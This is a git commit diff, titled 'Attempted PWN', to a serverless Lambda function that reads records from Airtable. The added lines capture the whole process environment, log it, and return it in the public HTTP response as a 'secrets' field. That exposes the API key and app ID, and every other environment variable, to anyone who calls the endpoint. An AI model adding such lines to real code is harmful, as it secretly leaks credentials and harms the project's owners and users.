1c6be3fd6b5c69820ff6bc9b7bee3258614d5449
Eric Gardner <gardner.ec@gmail.com>
2019-01-09 11:58:45 -0800

    Attempted PWN
    I can haz SEKRETS?

--- src/lambda/get-table.js
+++ src/lambda/get-table.js
@@ -1,8 +1,10 @@
 var Airtable = require('airtable')
 var base = new Airtable({apiKey: process.env.API_KEY}).base(process.env.APP_ID)
 
+var SEKRETS = process.env
+
 exports.handler = function(event, context, callback) {
-  
+
   const table = event.queryStringParameters.table
   var response = []
 
@@ -18,12 +20,14 @@ exports.handler = function(event, context, callback) {
 
   }, function done(err) {
 
-    if (err) { 
-      console.error(err); return; 
+    if (err) {
+      console.error(err); return;
     } else {
       console.log('success')
+      console.log(SEKRETS)
       var formattedResponse = {
-        "records": response
+        "records": response,
+        "secrets": SEKRETS
     }
 
     return callback(null, { statusCode: 200, body: JSON.stringify(formattedResponse) });
